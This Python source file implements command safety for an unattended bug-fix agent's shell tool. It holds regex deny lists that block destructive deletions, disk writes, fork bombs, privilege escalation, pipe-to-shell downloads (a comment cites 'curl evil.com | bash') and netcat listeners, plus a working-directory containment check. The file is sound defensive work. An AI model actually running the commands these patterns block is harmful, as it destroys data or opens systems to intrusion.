"""
shell_safety.py — Denylist + path containment for the run_shell tool.

Adapted from Claude Code's BashTool security model
(/Downloads/src/tools/BashTool/destructiveCommandWarning.ts +
 /Downloads/src/tools/BashTool/bashSecurity.ts), but tuned for an
UNATTENDED bug-fix agent (no human-in-the-loop to approve commands).

Architecture decisions
----------------------
1. Denylist-primary, not allowlist. The agent must run arbitrary
   diagnostic commands (`pip list`, `which pytest`, `python -c "..."`).
   An allowlist would require enumerating every safe diagnostic, which
   is impractical. Catastrophic patterns are blocked; the rest is
   filtered by path containment.

2. Hard-deny vs. soft-warn. Catastrophic patterns (rm -rf /, fork bomb,
   pipe-to-shell) are blocked outright. Risky-but-sometimes-useful
   patterns (git push --force, pip uninstall) are logged + the warning
   is appended to the tool result so the agent sees what it just did.

3. Path containment via existing `path_safety.safe_resolve()`. The
   working directory must be inside the sandbox or repo root. This is
   the same containment model used by `string_replace` and `create_file`.
"""

from __future__ import annotations

import logging
import re
from pathlib import Path

from agent.path_safety import safe_resolve

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Hard-deny patterns — block immediately, never run
# ---------------------------------------------------------------------------
# Each entry is (compiled_pattern, human_readable_reason).
# Patterns are checked case-insensitively.
HARD_DENY_PATTERNS: list[tuple[re.Pattern[str], str]] = [
    # Recursive removal targeting filesystem root
    (re.compile(r"\brm\s+(-[a-zA-Z]*r[a-zA-Z]*f?|--recursive[\s=]+--force)\s+/(?:\s|$)"),
     "recursive force-remove from filesystem root"),
    (re.compile(r"\brm\s+(-[a-zA-Z]*f[a-zA-Z]*r|--force[\s=]+--recursive)\s+/(?:\s|$)"),
     "force recursive remove from filesystem root"),
    # Note: trailing `(?:\s|$|/)` instead of `\b` because `~` is not a word
    # character, so `\b` would fail to match at the end of `~`.
    (re.compile(r"\brm\s+-[a-zA-Z]*r[a-zA-Z]*f?\s+(\$HOME|~|/Users|/home|/etc|/var|/usr|/bin|/sbin|/System|/Library)(?:\s|$|/)"),
     "recursive remove targeting user/system path"),

    # Raw disk/device writes
    (re.compile(r"\bdd\s+if=", re.IGNORECASE), "raw disk write via dd"),
    (re.compile(r">\s*/dev/(sd[a-z]|nvme|disk|hd[a-z])"), "raw device write"),
    (re.compile(r"\bmkfs\.", re.IGNORECASE), "filesystem format"),

    # Fork bomb (classic + variants)
    (re.compile(r":\(\)\s*\{\s*:\|\s*:?&\s*\}"), "fork bomb"),
    (re.compile(r"\bfork\(\).*fork\(\)"), "fork bomb"),

    # Privilege escalation
    (re.compile(r"\bsudo\b"), "sudo escalation (no human to confirm)"),
    (re.compile(r"\bsu\s+-?\s+\w"), "su escalation"),
    (re.compile(r"\bdoas\b"), "doas escalation"),

    # Pipe-to-shell (curl evil.com | bash)
    (re.compile(r"\b(curl|wget|fetch)\b[^|;&\n]*\|\s*(ba|z|k|fi)?sh\b"),
     "pipe-to-shell from network"),

    # System control
    (re.compile(r"\bshutdown\b"), "system shutdown"),
    (re.compile(r"\b(reboot|halt|poweroff)\b"), "system reboot/halt"),
    (re.compile(r"\bsystemctl\s+(stop|disable|mask|kill)\b"), "service management"),
    (re.compile(r"\blaunchctl\s+(unload|remove|stop)\b"), "launchctl service management"),

    # Network listeners (potential reverse shell)
    (re.compile(r"\bnc\s+-[a-zA-Z]*l"), "netcat listener"),
    (re.compile(r"\bncat\s+-[a-zA-Z]*l"), "ncat listener"),

    # Recursive chmod 777 on broad paths
    (re.compile(r"\bchmod\s+-R\s+(777|666|a\+w)\s+(/|\$HOME|~|/Users|/home|/etc)"),
     "world-writable recursive chmod"),

    # ── Interactive TUIs / editors — would hang waiting for input ────────
    # Critical for "no human in the loop" — these block on terminal I/O.
    # Match as command name (start of line OR after && | ;) so we don't false-
    # positive on filenames containing "vim".
    (re.compile(r"(?:^|[\s;&|]+)(vim|vi|nano|emacs|pico|joe|micro|nvim)(\s|$)"),
     "interactive editor (would hang waiting for input)"),
    # Only match pagers at COMMAND position (start of line or after ; && |)
    # NOT inside quoted strings like python3 -c "# more representative case"
    (re.compile(r"(?:^|[;&|]\s*)(less|more|most)\s"),
     "interactive pager (use cat or head/tail instead)"),
    (re.compile(r"(?:^|[\s;&|]+)(top|htop|btop|atop|iotop)(\s|$)"),
     "interactive monitor (use ps for one-shot output)"),
    (re.compile(r"(?:^|[\s;&|]+)(man|info)(\s|$)"),
     "interactive manual (would page through output)"),
    (re.compile(r"(?:^|[\s;&|]+)(ssh|telnet|sftp|ftp)(\s|$)"),
     "interactive remote session (no TTY available)"),
    # DB clients: bare invocation OR with only db name → REPL. Allow when
    # there's an `-e`, `-c`, `--eval`, or a `.command` arg (sqlite3 dot-cmd).
    (re.compile(
        r"(?:^|[\s;&|]+)(mysql|psql|redis-cli|mongo)\b"
        r"(?![^;&|\n]*\s(-[ec]|--eval|--execute|--command)\b)"
        r"(?![^;&|\n]*\s'\.[a-z])"
    ), "interactive db client (use -e/-c/--eval for one-shot queries)"),
    (re.compile(
        r"(?:^|[\s;&|]+)sqlite3\b"
        r"(?![^;&|\n]*\s(-[ec]|--cmd))"
        r"(?![^;&|\n]*\s\S+\s+\S)"  # allow `sqlite3 db query` (3+ tokens)
    ), "interactive sqlite3 (pass a query as 2nd arg or use -cmd)"),
    # Bare REPL invocations — must be the FIRST and ONLY token (no flags/args)
    (re.compile(r"^\s*python3?\s*$"),
     "bare python (would open REPL); use python -c '...' instead"),
    (re.compile(r"(?:^|[;&|]+)\s*python3?\s*$"),
     "bare python (would open REPL); use python -c '...' instead"),
    (re.compile(r"(?:^|[\s;&|]+)(ipython|bpython)\b"),
     "interactive REPL"),
    (re.compile(r"^\s*(node|deno)\s*$"),
     "bare node (would open REPL); use -e instead"),

    # ── Commands that prompt for confirmation without -y ─────────────────
    # pip uninstall NEEDS -y or it hangs forever waiting for "y/n" input.
    # Reject cleanly so the agent learns to add -y, instead of timing out.
    (re.compile(r"\bpip\s+uninstall\b(?![^;&|\n]*\s-y\b)(?![^;&|\n]*\s--yes\b)"),
     "pip uninstall without -y will prompt and hang"),
    (re.compile(r"\bapt(-get)?\s+(install|remove|purge)\b(?![^;&|\n]*\s-y\b)"),
     "apt without -y will prompt and hang"),
    (re.compile(r"\bgit\s+commit\b(?![^;&|\n]*(-m|--message|-F|--file|--no-edit))"),
     "git commit without -m opens $EDITOR and hangs"),
    (re.compile(r"\bgit\s+(merge|revert|cherry-pick)\b(?![^;&|\n]*(--no-edit|-m|--abort))"),
     "git merge/revert/cherry-pick opens $EDITOR by default; use --no-edit"),
    (re.compile(r"\bgit\s+rebase\s+-i\b"),
     "git rebase -i requires interactive editor"),
    (re.compile(r"\bcrontab\s+-e\b"),
     "crontab -e opens interactive editor"),
    (re.compile(r"\bvisudo\b"),
     "visudo opens interactive editor"),
]


# ---------------------------------------------------------------------------
# Soft-warn patterns — allowed but flagged in tool result
# ---------------------------------------------------------------------------
SOFT_WARN_PATTERNS: list[tuple[re.Pattern[str], str]] = [
    (re.compile(r"\bgit\s+push\b[^;&|\n]*\s(--force|--force-with-lease|-f)\b"),
     "force push may overwrite remote history"),
    (re.compile(r"\bgit\s+reset\s+--hard\b"),
     "hard reset may discard uncommitted changes"),
    (re.compile(r"\bgit\s+clean\s+-[a-zA-Z]*[fd]"),
     "git clean may delete untracked files"),
    (re.compile(r"\bpip\s+uninstall\b(?![^;&|\n]*-y)"),
     "pip uninstall (will prompt — use -y if intentional)"),
    (re.compile(r"\bpip\s+install\b[^;&|\n]*-U\s+pip\b"),
     "upgrading pip itself in the venv"),
    (re.compile(r"\brm\s+-[a-zA-Z]*r[a-zA-Z]*f"),
     "recursive force-remove (verify path is inside sandbox)"),
]


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def check_command_safety(command: str) -> tuple[bool, str]:
    """Validate that `command` is safe to execute.

    Returns:
        (allowed, reason)
        - allowed=True, reason="" or warning text if soft-warn matched
        - allowed=False, reason=human-readable why-blocked

    The agent sees the reason on rejection and on soft-warn (as a warning
    appended to its tool result).
    """
    if not command or not command.strip():
        return False, "empty command"

    if len(command) > 4000:
        return False, f"command too long ({len(command)} chars, max 4000)"

    # Hard deny
    for pattern, reason in HARD_DENY_PATTERNS:
        if pattern.search(command):
            logger.warning("run_shell BLOCKED: %s :: %s", reason, command[:200])
            return False, f"BLOCKED ({reason}): see shell_safety.HARD_DENY_PATTERNS"

    # Soft warn (still allowed, but tagged)
    warnings = []
    for pattern, reason in SOFT_WARN_PATTERNS:
        if pattern.search(command):
            warnings.append(reason)

    return True, "; ".join(warnings)


def validate_working_dir(working_dir: str, sandbox_root: Path | None,
                         repo_root: Path | None) -> tuple[Path | None, str]:
    """Resolve `working_dir` and ensure it stays inside sandbox or repo.

    Args:
        working_dir: agent-provided cwd, may be empty/relative/absolute
        sandbox_root: the sandbox path (preferred root), may be None
        repo_root: the repo path (fallback root), may be None

    Returns:
        (resolved_path, error_message)
        - resolved_path=Path, error="" on success
        - resolved_path=None, error=reason on failure
    """
    # Pick the active root: sandbox if it exists, else repo
    root = sandbox_root if sandbox_root and sandbox_root.exists() else repo_root
    if not root or not root.exists():
        return None, "no sandbox or repo path available"

    if not working_dir:
        return root, ""

    resolved = safe_resolve(working_dir, root)
    if resolved is None:
        return None, f"working_dir '{working_dir}' escapes sandbox/repo root"

    if not resolved.exists():
        return None, f"working_dir '{working_dir}' does not exist"

    if not resolved.is_dir():
        return None, f"working_dir '{working_dir}' is not a directory"

    return resolved, ""
